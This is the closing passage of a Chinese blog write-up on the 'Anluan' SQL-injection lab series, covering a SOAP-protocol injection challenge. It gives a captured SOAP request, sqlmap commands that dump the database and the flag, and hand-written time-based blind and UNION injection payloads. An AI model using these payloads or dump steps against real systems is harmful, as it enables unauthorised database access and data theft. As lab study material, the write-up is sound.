class="keyword">POST</span> <span class="string">/ws_soap.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.103.94.191:8018/ws_soap.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>pR1_sid=GqRRY0; ECS[display]=grid; ECS[history]=9%2C8; ECS[visit_times]=6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">SOAPAction</span><span class="punctuation">: </span>urn:tickets_stock#get_tickets_stock</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml;charset=UTF-8</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.103.94.191:8018</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>471</span><br><span class="line"></span><br><span class="line"><span class="language-vim">&lt;soapen<span class="variable">v:Envelope</span> xmln<span class="variable">s:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmln<span class="variable">s:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> xmln<span class="variable">s:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> xmln<span class="variable">s:urn</span>=<span class="string">&quot;urn:tickets_stock&quot;</span>&gt;</span></span><br><span class="line"><span class="language-vim">&lt;soapen<span class="variable">v:Header</span>/&gt;</span></span><br><span class="line"><span class="language-vim">&lt;soapen<span class="variable">v:Body</span>&gt;</span></span><br><span class="line"><span class="language-vim">&lt;urn:get_tickets_stock soapen<span class="variable">v:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span><br><span class="line"><span class="language-vim">&lt;title xsi:<span class="built_in">type</span>=<span class="string">&quot;xsd:string&quot;</span>&gt;gero et&lt;/title&gt;</span></span><br><span class="line"><span class="language-vim">&lt;/urn:get_tickets_stock&gt;</span></span><br><span class="line"><span class="language-vim">&lt;/soapen<span class="variable">v:Body</span>&gt;</span></span><br><span class="line"><span class="language-vim">&lt;/soapen<span class="variable">v:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.5xfy7j5u26w0.jpg" alt="tumeiimage"></p></li><li><p>sqlmap自动化部分步骤</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拿到当前数据库 --&gt; whalwl</span></span><br><span class="line">sqlmap -r admin.txt --batch --current-db</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拿到 flag 相关表 --&gt; this_flag</span></span><br><span class="line">sqlmap -r admin.txt --batch -D whalwl --tables</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拿到 this_flag 表下关键字段 --&gt; flag</span></span><br><span class="line">sqlmap -r admin.txt --batch -D whalwl -T this_flag --columns</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拿到flag（很慢，建议来把农药） --&gt; flag&#123;ba8b6a6f6e38ed7e173d03504132dbe8&#125;</span></span><br><span class="line">sqlmap -r admin.txt --batch -D whalwl -T this_flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.1janvc65uvs0.jpg" alt="tumeiimage"></p></li><li><p>基于 sqlmap payload 的时间盲注（手注）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据 sqlmap 提供的payload——时间盲注</span></span><br><span class="line">gero et<span class="string">&#x27; AND (SELECT 6543 FROM (SELECT(SLEEP(5)))woly) AND &#x27;</span>XqLo<span class="string">&#x27;=&#x27;</span>XqLo</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造判断当前数据库名长度——两层 select 语句</span></span><br><span class="line">gero et<span class="string">&#x27; and (select 1 from(select if(length(database())=5,2,sleep(10)))tumei) -- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 猜当前库名，配合 burp 爆破</span></span><br><span class="line"><span class="string">gero et&#x27;</span> and (<span class="keyword">select</span> <span class="number">1</span> from(<span class="keyword">select</span> <span class="keyword">if</span>((<span class="keyword">select</span> substr(database(),<span class="number">2</span>,<span class="number">1</span>)=<span class="string">&#x27;h&#x27;</span>),sleep(<span class="number">5</span>),<span class="number">6</span>))a) -- -</span><br><span class="line"></span><br><span class="line"><span class="comment">// ……猜flag，可以先猜内容长度，再进行爆破，减少非必要的时间，这里懒了</span></span><br><span class="line"><span class="comment">// 导出结果集，复制到excel进行排序提取内容，合并1列单元格：=TEXTJOIN(&quot;&quot;,TRUE,B2:B39)</span></span><br><span class="line"><span class="comment">// &#x27;&#123;&#x27;参数被转义问题，解决：爆破模块 --&gt; Payloads --&gt; Payload Encding 处取消勾选，即可不被编码。</span></span><br><span class="line">gero et<span class="string">&#x27; and (select 1 from(select if((select substr(flag,5,1) from this_flag limit 1,1)=&#x27;</span>&#123;<span class="string">&#x27;,sleep(5),6))tumei) -- -</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.220ga46rm76o.jpg" alt="tumeiimage"></p></li><li><p>基于 awvs payload 的联合查询（手注）</p></li></ol><ul><li>看了下 awvs 的扫描结果，嘿？直接出库名？联想到前面写时间盲注时思考是否会有回显位（那时直接在<code>gero et</code>的基础上操作，压根没置<code>-1</code>），果断修改 awvs payload 参数（重点：<code>-1</code>，使前一个 select 语句无结果）。<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接拿到库名</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select database() -- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 需要思路而已，其他老套路了，这里直接拿flag</span></span><br><span class="line"><span class="string">-1&#x27;</span> union <span class="keyword">select</span> flag from this_flag limit <span class="number">1</span>,<span class="number">1</span> -- -</span><br></pre></td></tr></table></figure><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.3nh2yxsokbm0.jpg" alt="tumeiimage"></li></ul><h1 id="0x0c-完本总结"><a href="#0x0c-完本总结" class="headerlink" title="0x0c 完本总结"></a>0x0c 完本总结</h1><blockquote><p>总的来讲，题目很基础，笔者很菜！一句话，贵在坚持、思考与行动！</p></blockquote></div><div class="post-copyright-info"><div class="article-copyright-info-container"><ul class="copyright-info-content"><li><span class="type">本文标题</span>：<span class="content">安鸾之SQL系列&amp;余下部分</span></li><li><span class="type">本文作者</span>：<span class="content">涂寐</span></li><li><span class="type">创建时间</span>：<span class="content">2022-06-13 08:38:26</span></li><li class="post-link"><span class="type">本文链接</span>：<span class="content">article/aca8184b.html</span></li><li><span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span></li></ul></div></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/whalwl/">#安鸾</a>&nbsp;</li><li class="tag-item"><a href="/tags/sql/">#SQL</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/article/6edc2289.html"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">安鸾之文件包含系列</span> <span class="post-nav-item">上一篇</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/article/88b952f3.html"><span class="title flex-center"><span class="post-nav-title-item">sqli-labs之Less-6</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;评论</div><div class="valine-container"><script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><div id="vcomments"></div><script data-pjax>function loadValine(){function e(e){switch(e){case"en":return"Author";case"zh-CN":return"博主";default:return"Master"}}new Valine({el:"#vcomments",appId:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appKey:"C0Wy6Sfq0qVag0nm59fc1D12",meta:["nick","mail","link"],avatar:"wavatar",enableQQ:!0,placeholder:"道友，请留步！请留言~",lang:"zh-CN".toLowerCase()});const a=setInterval(()=>{const n=document.querySelectorAll("#vcomments .vcards .vcard");if(n.length>0){let t="涂寐";if(t)for(let a of n){const n=a.querySelector(".vhead .vnick"),l=n.innerHTML;l===t&&(n.innerHTML=`${l} <span class="author">${e(KEEP.hexo_config.language)}</span>`)}clearInterval(a)}else clearInterval(a)},2e3)}{const e=setTimeout(()=>{loadValine(),clearTimeout(e)},1e3)}</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E5%BC%80%E9%A2%98%E8%AF%B4%E6%98%8E"><span class="nav-number">1.</span> <span class="nav-text">0x00 开题说明</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E4%BC%AA%E9%9D%99%E6%80%81-amp-%E6%90%9C%E7%B4%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">0x01 伪静态&amp;搜索注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA"><span class="nav-number">2.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.</span> <span class="nav-text">0o01 伪静态注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02-%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">2.3.</span> <span class="nav-text">0o02 利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-SQL%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A501"><span class="nav-number">3.</span> <span class="nav-text">0x02 SQL搜索型注入01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-1"><span class="nav-number">3.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">3.2.</span> <span class="nav-text">0o01 利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-Cookie%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">0x03 Cookie注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-2"><span class="nav-number">4.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-Cookie%E6%B3%A8%E5%85%A5"><span class="nav-number">4.2.</span> <span class="nav-text">0o01 Cookie注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02-%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-1"><span class="nav-number">4.3.</span> <span class="nav-text">0o02 利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-X-Forwarded-For%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">0x04 X-Forwarded-For注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-3"><span class="nav-number">5.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-X-Forwarded-For%E6%B3%A8%E5%85%A5"><span class="nav-number">5.2.</span> <span class="nav-text">0o01 X-Forwarded-For注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02-%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-2"><span class="nav-number">5.3.</span> <span class="nav-text">0o02 利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-POST%E7%9B%B2%E6%B3%A8-amp-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="nav-number">6.</span> <span class="nav-text">0x05 POST盲注&amp;万能密码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-4"><span class="nav-number">6.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-%E6%BC%8F%E6%B4%9E1"><span class="nav-number">6.2.</span> <span class="nav-text">0o01 漏洞1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02-%E6%BC%8F%E6%B4%9E2"><span class="nav-number">6.3.</span> <span class="nav-text">0o02 漏洞2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-SQL%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">7.</span> <span class="nav-text">0x06 SQL报错型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-5"><span class="nav-number">7.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-%E6%BC%8F%E6%B4%9E%E4%B8%80%EF%BC%9Ainsert%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">7.2.</span> <span class="nav-text">0o01 漏洞一：insert报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02%E6%BC%8F%E6%B4%9E%E4%BA%8C%EF%BC%9Aupdate%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">7.3.</span> <span class="nav-text">0o02漏洞二：update报错注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07-%E5%AE%BD%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5"><span class="nav-number">8.</span> <span class="nav-text">0x07 宽字符注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-6"><span class="nav-number">8.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">8.2.</span> <span class="nav-text">0o01 注入流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x08-%E5%AE%BD%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A502"><span class="nav-number">9.</span> <span class="nav-text">0x08 宽字符注入02</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-7"><span class="nav-number">9.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-ecshop-gbk%E5%AD%98%E5%9C%A8%E5%AE%BD%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5"><span class="nav-number">9.2.</span> <span class="nav-text">0o01 ecshop gbk存在宽字符注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">9.3.</span> <span class="nav-text">0o02 注入流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x09-SQL%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A502"><span class="nav-number">10.</span> <span class="nav-text">0x09 SQL报错型注入02</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-8"><span class="nav-number">10.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-Discuz-7-2-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">10.2.</span> <span class="nav-text">0o01 Discuz! 7.2 SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-1"><span class="nav-number">10.3.</span> <span class="nav-text">0o02 注入流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0a-Oracle%E6%B3%A8%E5%85%A5"><span class="nav-number">11.</span> <span class="nav-text">0x0a Oracle注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-9"><span class="nav-number">11.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-Oracle-%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86"><span class="nav-number">11.2.</span> <span class="nav-text">0o01 Oracle 部分知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0b00-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">11.2.1.</span> <span class="nav-text">0b00 基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b01-%E9%BB%98%E8%AE%A4%E8%A1%A8%E7%A9%BA%E9%97%B4"><span class="nav-number">11.2.2.</span> <span class="nav-text">0b01 默认表空间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b10-%E6%9D%83%E9%99%90%E4%B8%8E%E7%94%A8%E6%88%B7"><span class="nav-number">11.2.3.</span> <span class="nav-text">0b10 权限与用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b11-%E9%83%A8%E5%88%86%E7%B3%BB%E7%BB%9F%E8%A1%A8"><span class="nav-number">11.2.4.</span> <span class="nav-text">0b11 部分系统表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-2"><span class="nav-number">11.3.</span> <span class="nav-text">0o02 注入流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o03-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">11.4.</span> <span class="nav-text">0o03 参考文档</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0b-SOAP%E5%8D%8F%E8%AE%AE%E6%B3%A8%E5%85%A5"><span class="nav-number">12.</span> <span class="nav-text">0x0b SOAP协议注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0b00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA"><span class="nav-number">12.1.</span> <span class="nav-text">0b00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0b01-SOAP%E5%8D%8F%E8%AE%AE"><span class="nav-number">12.2.</span> <span class="nav-text">0b01 SOAP协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02-%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="nav-number">12.3.</span> <span class="nav-text">0o02 注入过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0c-%E5%AE%8C%E6%9C%AC%E6%80%BB%E7%BB%93"><span class="nav-number">13.</span> <span class="nav-text">0x0c 完本总结</span></a></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2021</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate" style="color:red"></i> &nbsp;<a href="/">涂寐</a></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item"></div><div class="theme-info info-item">由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a></div><script id="LA-DATA-WIDGET" crossorigin="anonymous" charset="UTF-8" src="https://v6-widget.51.la/v6/JiZItHVhLKBShkL0/quote.js?theme=#1690FF,#333333,#999999,#333333,#FFFFFF,#1690FF,18&f=18&display=0,0,1,1,0,1,1,1"></script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/dark-light-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/local-search.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/lazyload.js"></script><div class="post-scripts pjax"><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/post-helper.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/toc.js"></script></div><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/pjax.min.js"></script><script>window.addEventListener("DOMContentLoaded",()=>{window.pjax=new Pjax({selectors:["head title",".page-container",".pjax"],history:!0,debug:!1,cacheBust:!1,timeout:0,analytics:!1,currentUrlFullReload:!1,scrollRestoration:!1}),document.addEventListener("pjax:send",()=>{KEEP.utils.pjaxProgressBarStart()}),document.addEventListener("pjax:complete",()=>{KEEP.utils.pjaxProgressBarEnd(),window.pjax.executeScripts(document.querySelectorAll("script[data-pjax], .pjax script")),KEEP.refresh()})})</script></body></html>